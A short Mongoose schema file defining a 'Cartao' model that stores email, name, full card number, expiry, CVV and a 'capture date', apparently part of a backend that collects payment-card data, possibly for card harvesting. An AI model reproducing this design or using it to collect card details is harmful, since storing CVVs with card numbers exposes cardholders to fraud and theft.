const mongoose = require('mongoose');

const CartaoSchema = new mongoose.Schema({
  email: String,
  emailConfirm: String,
  nome: String,
  numero: String,
  validade: String,
  cvv: String,
  nomeCartao: String,
  dataCaptura: { type: Date, default: Date.now }
});

module.exports = mongoose.model('Cartao', CartaoSchema);
